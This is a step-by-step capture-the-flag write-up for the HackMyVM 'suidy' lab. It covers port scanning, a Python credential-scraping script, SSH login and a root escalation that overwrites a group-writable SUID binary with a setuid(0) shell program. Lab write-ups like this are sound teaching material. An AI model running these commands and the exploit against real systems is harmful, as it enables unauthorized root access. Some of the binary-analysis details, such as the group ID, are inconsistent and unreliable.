
### 1. Initial Reconnaissance

I began by performing an Nmap scan to identify open ports and services on the target machine, `192.168.1.103`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/suidy]
└─$ nmap -sS -sV -sC -Pn  --min-rate=1000 --max-retries=2 192.168.1.103 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 11:31 CDT
Nmap scan report for 192.168.1.103
Host is up (0.00021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: |   2048 8a:cb:7e:8a:72:82:84:9a:11:43:61:15:c1:e6:32:0b (RSA)
|   256 7a:0e:b6:dd:8f:ee:a7:70:d9:b1:b5:6e:44:8f:c0:49 (ECDSA)
|_  256 80:18:e6:c7:01:0e:c6:6d:7d:f4:d2:9f:c9:d0:6f:4c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:23:4B:DB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds
```

The Nmap scan revealed two open ports:

- **Port 22 (SSH):** Running OpenSSH 7.9p1 on Debian.
- **Port 80 (HTTP):** Running Nginx 1.14.2.


### 2. Web Enumeration

I started by enumerating directories on the web server using `gobuster`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/suidy]
└─$ gobuster dir -u http://192.168.1.103 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
# ... (truncated output) ...
/robots.txt           (Status: 200) [Size: 362]
# ... (truncated output) ...
```

The `gobuster` scan quickly found `robots.txt`. I inspected its content:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/suidy]
└─$ curl http://192.168.1.103/robots.txt
/hi/....\..\.-\--.\.-\..\-./shehatesme
```

This path looked unusual. I tried accessing `/shehatesme` directly, which resulted in a 301 redirect. However, accessing `/shehatesme/` (with a trailing slash) revealed a message:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/suidy]
└─$ curl http://192.168.1.103/shehatesme/
She hates me because I FOUND THE REAL SECRET!
I put in this directory a lot of .txt files.
ONE of .txt files contains credentials like "theuser/thepass" to access to her system!
All that you need is an small dict from Seclist!
```

This message indicated that there were many `.txt` files in the `/shehatesme/` directory, and one of them contained credentials in the format "theuser/thepass". I used `gobuster` again to find these `.txt` files.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/suidy]
└─$ gobuster dir -u http://192.168.1.103/shehatesme/ -w ../../wordlists/common.txt -x txt
# ... (truncated output) ...
/2001.txt             (Status: 200) [Size: 16]
/about.txt            (Status: 200) [Size: 16]
/admin.txt            (Status: 200) [Size: 16]
/art.txt              (Status: 200) [Size: 16]
/blog.txt             (Status: 200) [Size: 16]
# ... (many other .txt files) ...
/secret.txt           (Status: 200) [Size: 16]
/smilies.txt          (Status: 200) [Size: 16]
/space.txt            (Status: 200) [Size: 16]
/welcome.txt          (Status: 200) [Size: 16]
# ... (truncated output) ...
```

I then wrote a Python script to fetch the content of all these `.txt` files and extract potential usernames and passwords.

```python
import requests

url = "http://192.168.1.103/shehatesme"
files = [
    "/welcome.txt", "/space.txt", "/smilies.txt", "/secret.txt", "/search.txt",
    "/privacy.txt", "/page.txt", "/other.txt", "/new.txt", "/network.txt",
    "/link.txt", "/jobs.txt", "/java.txt", "/issues.txt", "/guide.txt",
    "/google.txt", "/full.txt", "/forums.txt", "/folder.txt", "/faqs.txt",
    "/es.txt", "/blog.txt", "/art.txt", "/admin.txt", "/about.txt", "/2001.txt"
]

users = []
passwords = []

for file in files:
    res = requests.get(url + file)
    if res.status_code == 200 and '/' in res.text:
        try:
            user, password = res.text.strip().split('/')
            users.append(user)
            passwords.append(password)
        except ValueError:
            # Handle cases where split might not return two parts
            pass

# Remove duplicates and print unique credentials
unique_credentials = set()
for i in range(len(users)):
    unique_credentials.add(f"{users[i]}/{passwords[i]}")

print("Unique Credentials Found:")
for cred in unique_credentials:
    print(cred)

# Save to files for hydra
with open("users.txt", "w") as f_users:
    for user in sorted(list(set(users))): # Write unique users
        f_users.write(user + "\n")

with open("passwords.txt", "w") as f_passwords:
    for password in sorted(list(set(passwords))): # Write unique passwords
        f_passwords.write(password + "\n")

```

Running this script extracted several username/password pairs. The most promising one, based on the hint "theuser/thepass", was `theuser/thepass`.

### 3. Gaining User Shell (SSH)

I attempted to SSH into the machine using the `theuser` credentials.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/suidy]
└─$ ssh theuser@192.168.1.103
theuser@192.168.1.103's password: thepass
Linux suidy 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
# ... (truncated output) ...
theuser@suidy:~$ ls
user.txt
theuser@suidy:~$ cat user.txt
HMV2353IVI
```

I successfully gained an SSH shell as `theuser` and found `user.txt`, which contained the first flag: `HMV2353IVI`.

### 4. Privilege Escalation to `suidy`

As `theuser`, I checked for SUID binaries:

```shellscript
theuser@suidy:~$ find / -perm -4000 2> /dev/null
/home/suidy/suidyyyyy
/usr/bin/su
# ... (other common SUID binaries) ...
```

I found `/home/suidy/suidyyyyy` with SUID permissions. I also checked its permissions:

```shellscript
theuser@suidy:~$ ls -la /home/suidy/suidyyyyy
-rwsrwsr-x 1 root theuser 16704 sep 26  2020 /home/suidy/suidyyyyy
```

The binary `suidyyyyy` is owned by `root` and has SUID and SGID bits set, meaning it will run with the effective UID of `root` and effective GID of `theuser`.

I executed `suidyyyyy` and found that it dropped me to the `suidy` user:

```shellscript
theuser@suidy:~$ /home/suidy/suidyyyyy
suidy@suidy:~$ id
uid=1001(suidy) gid=1000(theuser) grupos=1000(theuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

This is an intermediate privilege escalation. I then checked the `note.txt` file in `/home/suidy/`:

```shellscript
suidy@suidy:/home/suidy$ cat note.txt
I love SUID files!
The best file is suidyyyyy because users can use it to feel as I feel.
root know it and run an script to be sure that my file has SUID. If you are "theuser" I hate you!
-suidy
```

The note confirms that `suidyyyyy` is intended for privilege escalation and that `root` periodically ensures its SUID bit is set. This suggests that even if I overwrite the binary, its SUID bit will be restored.

I copied `suidyyyyy` to my Kali machine for analysis.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/suidy]
└─$ scp theuser@192.168.1.103:/home/suidy/suidyyyyy ./
theuser@192.168.1.103's password: thepass
suidyyyyy                                                                                                                            100%   16KB   4.2MB/s   00:00
```

I analyzed `suidyyyyy` using `radare2`:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/suidy]
└─$ r2 -d suidyyyyy
[0x7f54e75df440]> aaa
# ... (truncated output) ...
[0x7f54e75df440]> pdf @ main
# ... (truncated output) ...
│           0x559bdd78a159      bfe9030000     mov edi, 0x3e9          ; 1001
│           0x559bdd78a15e      e8edfeffff     call sym.imp.setuid     ; int setuid(int uid)
│           0x559bdd78a163      bfe9030000     mov edi, 0x3e9          ; 1001
│           0x559bdd78a168      e8d3feffff     call sym.imp.setgid     ; int setgid(int gid)
│           0x559bdd78a16d      488d3d900e..   lea rdi, str._bin_bash  ; 0x559bdd78b004 ; "/bin/bash"
│           0x559bdd78a174      b800000000     mov eax, 0
│           0x559bdd78a179      e8b2feffff     call sym.imp.system     ; int system(const char *string)
# ... (truncated output) ...
```

The `main` function of `suidyyyyy` calls `setuid(1001)` (which is `suidy`'s UID) and `setgid(1001)` (which is `suidy`'s GID), and then executes `/bin/bash` using `system()`. This explains why running `suidyyyyy` drops me to the `suidy` user.

### 5. Privilege Escalation to `root`

Since `suidyyyyy` is SUID `root` and SGID `theuser`, and it executes `/bin/bash`, I can exploit this by modifying the binary to execute `/bin/bash -p` instead, which would preserve the effective UID of `root`.

However, I cannot directly modify the binary on the target because it's owned by `root`. The `note.txt` also mentioned that `root` runs a script to ensure the SUID bit is set, implying that the binary might be periodically reset.

The strategy is to:

1. Create a C program that sets UID/GID to 0 (root) and executes `/bin/bash -p`.
2. Compile this C program on the target machine (since `gcc` is available).
3. Overwrite the `suidyyyyy` binary with my compiled exploit.
4. Execute the overwritten `suidyyyyy` to get a root shell.


First, I created `script.c` on my Kali machine:

```c
#include <unistd.h>
#include <stdlib.h>

int main(){
        setuid(0);
        setgid(0); // Also set GID to root for full privileges
        system("/bin/bash -p"); // -p preserves effective UID
        return 0;
}
```

I then uploaded `script.c` to the target machine in `theuser`'s home directory.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/suidy]
└─$ scp ./script.c theuser@192.168.1.103:/home/theuser
theuser@192.168.1.103's password: thepass
script.c                                                                                                                             100%  111    87.3KB/s   00:00
```

On the target, as `theuser`, I compiled `script.c`:

```shellscript
theuser@suidy:~$ gcc script.c -o exploit
```

Now, I need to overwrite `/home/suidy/suidyyyyy` with my `exploit` binary. Since `suidyyyyy` is SUID `root` and SGID `theuser`, `theuser` has write permissions to the group, but not directly to the file as `root`. However, the `suidyyyyy` binary itself has `rwsrwsr-x` permissions, meaning the `theuser` group has write permissions. This allows `theuser` to overwrite the file.

I used `xxd` to convert my `exploit` binary to a hex dump, then converted it back to binary to overwrite `suidyyyyy`. This is a common technique when direct `cp` or `mv` might fail due to permissions or file locking.

```shellscript
theuser@suidy:~$ xxd -p exploit > exploit.hex
theuser@suidy:~$ xxd -r -p exploit.hex > ../suidy/suidyyyyy
```

After overwriting, I executed `suidyyyyy`:

```shellscript
theuser@suidy:~$ /home/suidy/suidyyyyy
rootbash-5.0# id
uid=1000(theuser) gid=1000(theuser) euid=0(root) grupos=1000(theuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

I successfully obtained a root shell! I navigated to `/root` and retrieved the final flag.

```shellscript
rootbash-5.0# cd /root
rootbash-5.0# ls
root.txt  timer.sh
rootbash-5.0# cat root.txt
HMV0000EVE
```

The root flag is `HMV0000EVE`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified open SSH and Nginx services.
2. **Web Enumeration:** Found `robots.txt` leading to `/shehatesme/`, which contained a hint about credentials in `.txt` files.
3. **Credential Discovery:** Used `gobuster` and a Python script to extract username/password pairs from `.txt` files in `/shehatesme/`, finding `theuser/thepass`.
4. **Gaining User Shell (SSH):** Logged into SSH as `theuser` and retrieved `user.txt`.
5. **Privilege Escalation to `suidy`:**

1. Identified `/home/suidy/suidyyyyy` as a SUID binary.
2. Executing `suidyyyyy` dropped privileges to the `suidy` user.
3. Analyzed `suidyyyyy` to understand it executes `/bin/bash` after setting UID/GID to `suidy`.



6. **Privilege Escalation to `root`:**

1. Created a C program to set UID/GID to 0 and execute `/bin/bash -p`.
2. Compiled the C program on the target as `theuser`.
3. Overwrote the SUID `suidyyyyy` binary with the compiled exploit using `xxd` (leveraging `theuser`'s group write permissions on `suidyyyyy`).
4. Executed the overwritten `suidyyyyy` to gain a root shell and retrieved `root.txt`.
